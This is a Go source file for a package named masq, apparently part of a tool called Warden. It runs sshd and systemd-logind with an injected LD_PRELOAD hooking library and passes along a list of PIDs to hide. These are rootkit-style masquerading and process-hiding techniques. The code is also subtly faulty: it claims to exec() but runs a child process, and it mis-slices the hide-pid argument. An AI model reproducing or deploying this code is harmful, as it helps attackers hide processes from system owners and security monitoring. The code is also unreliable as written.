// Package masq provides process masquerading functionality for Warden.
// It replaces legitimate processes with Warden instances while maintaining
// the original PID and process identity.
package masq

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

// TargetProcess defines a process that Warden can replace
type TargetProcess struct {
	Path        string // Path to the binary being replaced
	Description string // Human-readable description
}

// Primary replacement targets
var (
	LogindTarget = TargetProcess{
		Path:        "/usr/lib/systemd/systemd-logind",
		Description: "systemd logind daemon",
	}
	SSHDTarget = TargetProcess{
		Path:        "/usr/sbin/sshd",
		Description: "OpenSSH server daemon",
	}
)

// ReplaceProcess replaces the current process with a target process via exec()
func ReplaceProcess(target TargetProcess, args []string) error {
	cmd := exec.Command(target.Path, args...)
	
	// Set LD_PRELOAD to inject our hooking library
	preload := os.Getenv("LD_PRELOAD")
	if preload == "" {
		preload = "/usr/lib/warden/warden_hook.so"
	} else if !strings.Contains(preload, "warden_hook.so") {
		preload += ":/usr/lib/warden/warden_hook.so"
	}
	cmd.Env = append(os.Environ(), fmt.Sprintf("LD_PRELOAD=%s", preload))
	
	// Set hidden PIDs for the hooking library to filter
	var hiddenPids []string
	for _, arg := range args {
		if strings.HasPrefix(arg, "--hide-pid=") {
			parts := strings.SplitN(arg[10:], ",", 2)
			hiddenPids = append(hiddenPids, parts...)
		}
	}
	
	if len(hiddenPids) > 0 {
		cmd.Env = append(cmd.Env, fmt.Sprintf("WARDEN_HIDE_PIDS=%s", strings.Join(hiddenPids, ",")))
	}
	
	return cmd.Run()
}

// GetTargetPID returns the PID of a target process by name
func GetTargetPID(name string) (int, error) {
	cmd := exec.Command("pgrep", "-x", name)
	output, err := cmd.Output()
	if err != nil {
		return 0, fmt.Errorf("failed to find %s: %w", name, err)
	}
	
	pidStr := strings.TrimSpace(string(output))
	if pidStr == "" {
		return 0, fmt.Errorf("%s not running", name)
	}
	
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return 0, fmt.Errorf("invalid PID for %s: %w", name, err)
	}
	
	return pid, nil
}

// IsProcessRunning checks if a process with the given PID is running
func IsProcessRunning(pid int) bool {
	cmd := exec.Command("kill", "-0", strconv.Itoa(pid))
	err := cmd.Run()
	return err == nil
}